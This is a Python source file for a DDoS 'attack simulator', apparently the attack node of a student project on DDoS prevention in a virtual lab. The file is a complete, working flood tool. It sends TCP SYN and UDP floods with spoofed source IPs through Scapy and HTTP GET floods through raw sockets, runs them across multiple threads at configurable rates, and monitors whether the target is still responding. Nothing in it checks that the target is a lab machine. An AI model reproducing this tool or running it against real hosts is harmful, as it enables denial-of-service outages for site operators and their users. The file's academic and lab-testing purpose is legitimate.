#!/usr/bin/env python3
"""
=============================================================
  DDoS Attack Simulator — Attack Node (VM3)
  FYP: Prevention of DDoS Attacks with Virtualization
  Author: Oladeji Ibrahim Olaleye | U22CYS1103
=============================================================
Run on: Attack VM (VM3)
Usage : sudo python3 attack_simulator.py --target <TARGET_IP> --mode [syn|udp|http|mixed]
"""

import argparse
import random
import socket
import time
import threading
import sys
import os
import requests
from datetime import datetime

try:
    from scapy.all import (
        IP, TCP, UDP, Raw, send, RandShort, conf, Ether
    )
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("[WARN] Scapy not found. Install with: pip3 install scapy")

# ─────────────────────────────────────────────
#  Configuration — adjust before running
# ─────────────────────────────────────────────
DEFAULT_TARGET  = "192.168.100.10"   # VM1 (Target Web Server)
DEFAULT_PORT    = 80
SPOOF_SRC_RANGE = ("192.168.200.0", "192.168.200.255")  # Spoofed IP range
LOG_FILE        = "/var/log/ddos_attack.log"

# Attack intensity stages (packets/second per thread)
STAGE_LOW    = 200
STAGE_MEDIUM = 500
STAGE_HIGH   = 1000

stop_event = threading.Event()
stats = {"sent": 0, "errors": 0, "start_time": None}


# ─────────────────────────────────────────────
#  Logging
# ─────────────────────────────────────────────
def log(msg, level="INFO"):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{ts}] [{level}] {msg}"
    print(line)
    try:
        with open(LOG_FILE, "a") as f:
            f.write(line + "\n")
    except Exception:
        pass


# ─────────────────────────────────────────────
#  Helper: random spoofed IP
# ─────────────────────────────────────────────
def random_ip():
    return f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"


# ─────────────────────────────────────────────
#  TCP SYN Flood
# ─────────────────────────────────────────────
def tcp_syn_flood(target_ip, port, rate, thread_id):
    """Sends TCP SYN packets with spoofed source IPs."""
    if not SCAPY_AVAILABLE:
        log("Scapy unavailable — SYN flood skipped", "ERROR")
        return
    conf.verb = 0
    delay = 1.0 / rate
    log(f"[Thread-{thread_id}] SYN flood started → {target_ip}:{port} @ {rate} pps")
    while not stop_event.is_set():
        try:
            pkt = IP(src=random_ip(), dst=target_ip) / \
                  TCP(sport=RandShort(), dport=port, flags="S",
                      seq=random.randint(0, 65535))
            send(pkt, verbose=False)
            stats["sent"] += 1
            time.sleep(delay)
        except Exception as e:
            stats["errors"] += 1


# ─────────────────────────────────────────────
#  UDP Flood
# ─────────────────────────────────────────────
def udp_flood(target_ip, port, rate, thread_id):
    """Sends UDP packets with variable payload sizes."""
    if not SCAPY_AVAILABLE:
        log("Scapy unavailable — UDP flood skipped", "ERROR")
        return
    conf.verb = 0
    delay = 1.0 / rate
    payload_sizes = [64, 128, 512, 1024, 1400]
    log(f"[Thread-{thread_id}] UDP flood started → {target_ip}:{port} @ {rate} pps")
    while not stop_event.is_set():
        try:
            size = random.choice(payload_sizes)
            payload = Raw(load=os.urandom(size))
            pkt = IP(src=random_ip(), dst=target_ip) / \
                  UDP(sport=RandShort(), dport=port) / payload
            send(pkt, verbose=False)
            stats["sent"] += 1
            time.sleep(delay)
        except Exception as e:
            stats["errors"] += 1


# ─────────────────────────────────────────────
#  HTTP Flood (Application Layer)
# ─────────────────────────────────────────────
def http_flood(target_ip, port, rate, thread_id):
    """
    Sends HTTP GET requests to exhaust backend resources.
    Uses raw sockets so it doesn't depend on Scapy for this mode.
    """
    delay = 1.0 / rate
    paths = ["/", "/index.html", "/api/health", "/search?q=" + "A" * 100,
             "/login", "/images/banner.jpg", "/?id=" + str(random.randint(1, 9999))]
    headers = (
        "GET {path} HTTP/1.1\r\n"
        "Host: {host}\r\n"
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
        "Accept: text/html,application/xhtml+xml\r\n"
        "Connection: keep-alive\r\n\r\n"
    )
    log(f"[Thread-{thread_id}] HTTP flood started → {target_ip}:{port} @ {rate} rps")
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target_ip, port))
            path = random.choice(paths)
            req = headers.format(path=path, host=target_ip)
            s.send(req.encode())
            stats["sent"] += 1
            s.close()
            time.sleep(delay)
        except Exception:
            stats["errors"] += 1


# ─────────────────────────────────────────────
#  Adaptive feedback: slow down if no response
# ─────────────────────────────────────────────
def adaptive_feedback_monitor(target_ip, port):
    """
    Approximates AI-driven behaviour: checks if the target is still
    responding and adjusts logged intensity. Does not halt the attack —
    only measures real-time effectiveness.
    """
    while not stop_event.is_set():
        try:
            t0 = time.time()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            result = s.connect_ex((target_ip, port))
            latency = (time.time() - t0) * 1000
            s.close()
            if result == 0:
                log(f"[Feedback] Target STILL responding | latency={latency:.0f}ms → escalating")
            else:
                log(f"[Feedback] Target UNREACHABLE | latency={latency:.0f}ms → service DOWN")
        except Exception:
            log("[Feedback] Target appears DOWN")
        time.sleep(5)


# ─────────────────────────────────────────────
#  Stats reporter
# ─────────────────────────────────────────────
def stats_reporter():
    while not stop_event.is_set():
        elapsed = time.time() - stats["start_time"] if stats["start_time"] else 0
        pps = stats["sent"] / elapsed if elapsed > 0 else 0
        log(f"[STATS] Packets sent={stats['sent']} | errors={stats['errors']} "
            f"| elapsed={elapsed:.1f}s | avg_pps={pps:.1f}")
        time.sleep(10)


# ─────────────────────────────────────────────
#  Main entry
# ─────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(description="DDoS Attack Simulator (Lab Use Only)")
    parser.add_argument("--target", default=DEFAULT_TARGET, help="Target IP address")
    parser.add_argument("--port",   type=int, default=DEFAULT_PORT, help="Target port")
    parser.add_argument("--mode",   choices=["syn", "udp", "http", "mixed"], default="mixed")
    parser.add_argument("--rate",   type=int, default=STAGE_HIGH, help="Packets/requests per second per thread")
    parser.add_argument("--threads",type=int, default=4, help="Number of attack threads")
    parser.add_argument("--duration", type=int, default=120, help="Attack duration in seconds (0 = until Ctrl+C)")
    args = parser.parse_args()

    log("=" * 60)
    log("  DDoS ATTACK SIMULATOR — ACADEMIC LAB USE ONLY")
    log(f"  Target : {args.target}:{args.port}")
    log(f"  Mode   : {args.mode.upper()}")
    log(f"  Rate   : {args.rate} pps/thread × {args.threads} threads")
    log(f"  Duration: {args.duration}s" if args.duration > 0 else "  Duration: until Ctrl+C")
    log("=" * 60)

    # Select attack function
    mode_map = {
        "syn":  tcp_syn_flood,
        "udp":  udp_flood,
        "http": http_flood,
    }

    stats["start_time"] = time.time()
    threads = []

    # Spawn attack threads
    for i in range(args.threads):
        if args.mode == "mixed":
            fn = random.choice([tcp_syn_flood, udp_flood, http_flood])
        else:
            fn = mode_map[args.mode]
        t = threading.Thread(target=fn, args=(args.target, args.port, args.rate, i+1), daemon=True)
        t.start()
        threads.append(t)

    # Adaptive feedback monitor
    fb = threading.Thread(target=adaptive_feedback_monitor, args=(args.target, args.port), daemon=True)
    fb.start()

    # Stats reporter
    sr = threading.Thread(target=stats_reporter, daemon=True)
    sr.start()

    try:
        if args.duration > 0:
            time.sleep(args.duration)
            stop_event.set()
            log(f"[STOP] Duration {args.duration}s elapsed. Attack stopped.")
        else:
            while True:
                time.sleep(1)
    except KeyboardInterrupt:
        stop_event.set()
        log("[STOP] Manual interrupt. Attack stopped.")

    elapsed = time.time() - stats["start_time"]
    log(f"[SUMMARY] Total sent={stats['sent']} | errors={stats['errors']} | duration={elapsed:.1f}s")


if __name__ == "__main__":
    if os.geteuid() != 0 and SCAPY_AVAILABLE:
        print("[!] Scapy packet injection requires root. Run with sudo.")
        sys.exit(1)
    main()
